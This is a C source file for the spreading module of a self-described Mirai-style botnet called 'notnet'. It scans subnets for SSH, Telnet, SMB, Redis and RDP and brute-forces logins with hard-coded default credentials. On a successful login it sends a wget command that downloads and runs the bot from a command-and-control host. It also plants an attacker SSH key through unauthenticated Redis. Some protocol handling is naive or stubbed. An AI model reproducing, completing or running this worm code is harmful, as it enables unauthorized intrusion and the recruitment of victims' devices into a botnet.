/*
 * notnet - Modern Mirai-Style Botnet
 * spread.c - Multi-vector spreading module
 *
 * Targets: SSH, Telnet, SMB, Redis, RDP
 */
#include "spread.h"
#include "util.h"
#include "protocol.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/select.h>

/* ── Default credentials ───────────────────────────────────── */
/* Mirai-style credential pool — can be extended via C2 */
static const char *default_users[] = {
    "admin", "root", "user", "test", "guest",
    "pi", "ubuntu", "deploy", "ftp", "www",
    "oracle", "postgres", "mysql", "mssql", "redis",
    "telnet", "default", "support", "info", "operator",
    NULL
};

static const char *default_passes[] = {
    "admin", "password", "123456", "root", "toor",
    "pass", "test", "guest", "12345", "1234",
    "123456789", "letmein", "welcome", "monkey", "qwerty",
    "abc123", "login", "default", "111111", "666666",
    "123", "123456789", "changeme", "123123", "password1",
    NULL
};

/* ── Helper ─────────────────────────────────────────────────── */
/* SECURITY FIX (#15): send_command now actually sends commands over an
 * open socket instead of just logging. For SSH/Telnet this sends the
 * command followed by a newline. */
static void send_command(int sock, const char *service, const char *cmd) {
    log_info("send_cmd: %s '%s'", service, cmd);
    if (sock >= 0) {
        char cmd_line[1024];
        int len = snprintf(cmd_line, sizeof(cmd_line), "%s\r\n", cmd);
        if (len < (int)sizeof(cmd_line)) {
            send(sock, cmd_line, len, 0);
        }
    }
}

/* ── Connection helpers ─────────────────────────────────────── */
static int create_connection(const char *ip, uint16_t port, int timeout_ms) {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    /* Set non-blocking for timeout */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
     * gethostbyname + memcpy (h_length can be 16 for IPv6, overflowing). */
    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        addr.sin_addr.s_addr = inet_addr(ip);
        if (addr.sin_addr.s_addr == INADDR_NONE) {
            close(sock);
            return -1;
        }
    }
    
    int ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }
    
    /* Wait with timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }
    
    /* Restore blocking */
    fcntl(sock, F_SETFL, flags);
    return sock;
}

/* ── SSH Spreading ───────────────────────────────────────────── */
int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *pass) {
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;
    
    /* Read banner */
    char banner[256];
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, banner, sizeof(banner) - 1, 0);
        banner[sizeof(banner) - 1] = '\0';
    }
    
    /* Check for SSH-2 banner (more secure than SSH-1) */
    if (strstr(banner, "SSH-2") == NULL) {
        close(sock);
        return -1;
    }
    
    /* Send SSH banner */
    char our_banner[256];
    snprintf(our_banner, sizeof(our_banner), "SSH-2.0-Notnet\r\n");
    send(sock, our_banner, strlen(our_banner), 0);
    
    /* Read server banner or prompt */
    char resp[256];
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    select(sock + 1, &fds, NULL, NULL, &tv);
    recv(sock, resp, sizeof(resp) - 1, 0);
    
    /* Send username */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
    send(sock, cmd, strlen(cmd), 0);
    
    /* Read password prompt */
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    select(sock + 1, &fds, NULL, NULL, &tv);
    recv(sock, resp, sizeof(resp) - 1, 0);
    
    /* Send password */
    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
    send(sock, cmd, strlen(cmd), 0);
    
    /* Read response */
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    
    int success = 0;
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, resp, sizeof(resp) - 1, 0);
        resp[sizeof(resp) - 1] = '\0';
        /* Check for successful login indicators */
        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "Welcome")) {
            success = 1;
        }
    }
    
    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
    if (success) return sock;
    close(sock);
    return -1;
}

int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->ssh_enabled) return -1;
    
    log_info("SSH: brute-forcing %s:%d", ip, port);
    
    /* Try default credentials */
    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock_fd = try_login_ssh(ip, port, default_users[u], default_passes[p]);
            if (sock_fd >= 0) {
                log_info("SSH: cracked %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                
                /* Download and install binary */
                char cmd[512];
                char dl_url[512];
                snprintf(dl_url, sizeof(dl_url),
                    "http://%s:%d/bot/%s",
                    bot->c2_http.server, PAYLOAD_DL_PORT, "notnet");
                snprintf(cmd, sizeof(cmd),
                    "wget %s -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
                    dl_url);
                /* SECURITY FIX (#15): Send command over the established socket */
                send_command(sock_fd, "ssh", cmd);
                close(sock_fd);
                return 0;
            }
        }
    }
    
    return -1;
}

/* ── Telnet Spreading ─────────────────────────────────────── */
int try_login_telnet(const char *ip, uint16_t port, const char *user, const char *pass) {
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;
    
    char banner[256];
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, banner, sizeof(banner) - 1, 0);
    }
    
    /* Send username */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
    send(sock, cmd, strlen(cmd), 0);
    
    /* Read prompt */
    char resp[256];
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, resp, sizeof(resp) - 1, 0);
    }
    
    /* Send password */
    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
    send(sock, cmd, strlen(cmd), 0);
    
    /* Read response */
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    
    int success = 0;
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, resp, sizeof(resp) - 1, 0);
        resp[sizeof(resp) - 1] = '\0';
        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "OK")) {
            success = 1;
        }
    }
    
    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
    if (success) return sock;
    close(sock);
    return -1;
}

int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->telnet_enabled) return -1;
    
    log_info("Telnet: brute-forcing %s:%d", ip, port);
    
    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock_fd = try_login_telnet(ip, port, default_users[u], default_passes[p]);
            if (sock_fd >= 0) {
                log_info("Telnet: cracked %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                
                char cmd[512];
                snprintf(cmd, sizeof(cmd),
                    "wget http://%s:%d/bot/notnet -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
                    bot->c2_http.server, PAYLOAD_DL_PORT);
                /* SECURITY FIX (#15): Send command over the established socket */
                send_command(sock_fd, "telnet", cmd);
                close(sock_fd);
                return 0;
            }
        }
    }
    
    return -1;
}

/* ── SMB Spreading ────────────────────────────────────────── */
int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass) {
    /* Simple SMB connection attempt */
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;
    
    /* SMB1 negotiation */
    uint8_t neg[512];
    neg[0] = 0x73; /* SMB header */
    /* ... simplified protocol ... */
    send(sock, neg, sizeof(neg), 0);
    
    /* Read response */
    char resp[512];
    int received = recv(sock, resp, sizeof(resp), 0);
    close(sock);
    
    /* Check for successful auth */
    return (received > 0 && resp[0] == 0x73);
}

int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->smb_enabled) return -1;
    
    log_info("SMB: brute-forcing %s:%d", ip, port);
    
    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            if (try_login_smb(ip, port, default_users[u], default_passes[p])) {
                log_info("SMB: cracked %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                /* NOTE: SMB spreading provides auth confirmation only.
                 * Full payload deployment requires SMB file upload +
                 * scheduled task creation (not yet implemented). */
                send_command(-1, "smb", "payload deployment not supported over SMB");
                return 0;
            }
        }
    }
    
    return -1;
}

/* ── Redis Spreading ───────────────────────────────────────── */
int exploit_redis_unauth(const char *ip, uint16_t port) {
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;
    
    /* Send Redis commands */
    char cmd[512];
    
    /* Set SSH key */
    snprintf(cmd, sizeof(cmd),
        "CONFIG SET dir /root/.ssh\r\n"
        "CONFIG SET dbfilename authorized_keys\r\n"
        "SET key1 \"ssh-rsa AAAAB3NzaC1...notnet-key...\"\r\n"
        "SAVE\r\n"
        "PING\r\n");
    
    send(sock, cmd, strlen(cmd), 0);
    
    /* Read response */
    char resp[256];
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    
    int success = 0;
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, resp, sizeof(resp) - 1, 0);
        resp[sizeof(resp) - 1] = '\0';
        /* Check for "+PONG" response indicating SAVE succeeded */
        if (strstr(resp, "+PONG")) {
            success = 1;
        }
    }
    
    close(sock);
    return success;
}

int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->redis_enabled) return -1;
    
    log_info("Redis: unauthenticated access %s:%d", ip, port);
    
    /* Try unauthenticated first */
    if (exploit_redis_unauth(ip, port)) {
        log_info("Redis: exploited unauth on %s:%d", ip, port);
        /* Wait for SSH key to take effect */
        usleep(5000000); /* 5 seconds */
        
        /* Now spread via SSH */
        spread_ssh(bot, ip, 22);
        return 0;
    }
    
    /* Try brute-force */
    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
            if (sock < 0) continue;
            
            /* Send AUTH */
            char auth_cmd[256];
            snprintf(auth_cmd, sizeof(auth_cmd), "AUTH %s\r\n", default_passes[p]);
            send(sock, auth_cmd, strlen(auth_cmd), 0);
            
            /* Wait for AUTH response */
            char auth_resp[256];
            fd_set fds;
            struct timeval tv;
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            tv.tv_sec = 2;
            tv.tv_usec = 0;
            
            if (select(sock + 1, &fds, NULL, NULL, &tv) <= 0) {
                close(sock);
                continue;
            }
            recv(sock, auth_resp, sizeof(auth_resp) - 1, 0);
            auth_resp[sizeof(auth_resp) - 1] = '\0';
            
            /* AUTH returns +OK on success */
            if (strstr(auth_resp, "+OK")) {
                log_info("Redis: auth success %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                
                /* Send PING to verify */
                send(sock, "PING\r\n", 6, 0);
                FD_ZERO(&fds);
                FD_SET(sock, &fds);
                tv.tv_sec = 2;
                tv.tv_usec = 0;
                
                if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
                    char ping_resp[256];
                    recv(sock, ping_resp, sizeof(ping_resp) - 1, 0);
                    ping_resp[sizeof(ping_resp) - 1] = '\0';
                    /* +PONG confirms the connection is stable */
                    if (strstr(ping_resp, "+PONG")) {
                        close(sock);
                        /* Exploit */
                        exploit_redis_unauth(ip, port);
                        usleep(5000000);
                        spread_ssh(bot, ip, 22);
                        return 0;
                    }
                }
            }
            
            close(sock);
        }
    }
    
    return -1;
}

/* ── RDP Spreading ────────────────────────────────────────── */
int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass) {
    /* Simple RDP connection attempt */
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;
    
    /* Send RDP header */
    uint8_t hdr[256];
    memset(hdr, 0, sizeof(hdr));
    send(sock, hdr, sizeof(hdr), 0);
    
    /* Read response */
    char resp[256];
    int received = recv(sock, resp, sizeof(resp), 0);
    close(sock);
    
    return (received > 0);
}

int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->rdp_enabled) return -1;
    
    log_info("RDP: brute-forcing %s:%d", ip, port);
    
    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            if (try_login_rdp(ip, port, default_users[u], default_passes[p])) {
                log_info("RDP: cracked %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                /* NOTE: RDP spreading provides auth confirmation only.
                 * Full payload deployment requires RDP virtual channel
                 * command injection (not yet implemented). */
                send_command(-1, "rdp", "payload deployment not supported over RDP");
                return 0;
            }
        }
    }
    
    return -1;
}

/* ── Core Spreading ─────────────────────────────────────── */
int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
    /* Parse subnet: 192.168.1.0/24 */
    char net[16], mask[4] = {0};
    if (sscanf(subnet, "%15[^/]/%3s", net, mask) < 2) {
        log_error("scan_subnet: invalid subnet format '%s' (expected a.b.c.d/nn)", subnet);
        return -1;
    }
    int prefix = atoi(mask);
    /* SECURITY FIX (#4): Validate prefix range to prevent integer overflow
     * in (1 << (32 - prefix)). Also reject prefixes smaller than /16 to
     * avoid scanning millions of IPs. */
    if (prefix < 16 || prefix > 32) {
        log_error("scan_subnet: invalid prefix %d (must be 16-32)", prefix);
        return -1;
    }
    
    /* SECURITY FIX (#4): Use inet_pton instead of inet_addr (deprecated,
     * inet_addr returns INADDR_NONE for both error and 255.255.255.255). */
    struct in_addr in;
    if (inet_pton(AF_INET, net, &in) != 1) {
        log_error("scan_subnet: invalid IP %s", net);
        return -1;
    }
    uint32_t net_ip = in.s_addr;  /* already in network byte order */
    
    uint32_t host_ip = ntohl(net_ip);
    /* With prefix clamped to [16,32], (1<<(32-prefix)) is at most 1<<16 = 65536 */
    int hosts = (1 << (32 - prefix)) - 2; /* exclude network and broadcast */
    /* Hard cap at 254 even for /16+ to prevent runaway scanning */
    if (hosts > 254) hosts = 254;
    if (bot->scan_max_hosts > 0 && bot->scan_max_hosts < (uint32_t)hosts) {
        hosts = (int)bot->scan_max_hosts;
    }
    if (hosts < 1) hosts = 1;  /* guarantee at least one iteration */
    
    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    log_info("scan: %s/%s (%d hosts) mask=0x%x timeout=%dms", net, mask, hosts, service_mask, timeout);
    
    for (int i = 1; i <= hosts; i++) {
        if (!(i % 50)) {
            log_info("scan: %d/%d done", i, hosts);
        }
        
        uint32_t ip = host_ip + i;
        char ip_str[16];
        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
                 (ip >> 24) & 0xFF, (ip >> 16) & 0xFF,
                 (ip >> 8) & 0xFF, ip & 0xFF);
        
        /* Scan target services based on mask */
        if (service_mask & SPREAD_SSH) {
            scan_port(bot, ip_str, 22);
        }
        if (service_mask & SPREAD_TELNET) {
            scan_port(bot, ip_str, 23);
        }
        if (service_mask & SPREAD_SMB) {
            scan_port(bot, ip_str, 445);
        }
        if (service_mask & SPREAD_REDIS) {
            scan_port(bot, ip_str, 6379);
        }
        if (service_mask & SPREAD_RDP) {
            scan_port(bot, ip_str, 3389);
        }
    }
    
    return 0;
}

int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port) {
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;
    
    close(sock);
    
    /* Port is open */
    bot->scan_count++;
    
    /* Determine service */
    uint8_t service = 0;
    switch (port) {
        case 22:  service = SPREAD_SSH; break;
        case 23:  service = SPREAD_TELNET; break;
        case 445: service = SPREAD_SMB; break;
        case 6379: service = SPREAD_REDIS; break;
        case 3389: service = SPREAD_RDP; break;
    }
    
    log_info("port open: %s:%d", ip, port);
    
    /* Spread to this port */
    switch (port) {
        case 22:  spread_ssh(bot, ip, port); break;
        case 23:  spread_telnet(bot, ip, port); break;
        case 445: spread_smb(bot, ip, port); break;
        case 6379: spread_redis(bot, ip, port); break;
        case 3389: spread_rdp(bot, ip, port); break;
    }
    
    return 0;
}

int spread_local(notnet_bot_t *bot) {
    log_info("Local spread cycle started");
    
    /* Resolve peers */
    if (protocol_resolve_peers(bot) == 0 && bot->peer_count > 0) {
        log_info("Using %d peers for spread", bot->peer_count);
    }
    
    /* Scan explicit targets if configured (overrides defaults) */
    if (bot->scan_target_count > 0) {
        log_info("Scanning %d explicit targets", bot->scan_target_count);
        uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
        for (int i = 0; i < bot->scan_target_count && i < 16; i++) {
            scan_subnet(bot, bot->scan_targets[i], all_services);
        }
        return 0;
    }
    
    /* Default: just scan local /24 (not /16) */
    scan_subnet(bot, "192.168.1.0/24",
                SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP);
    
    return 0;
}
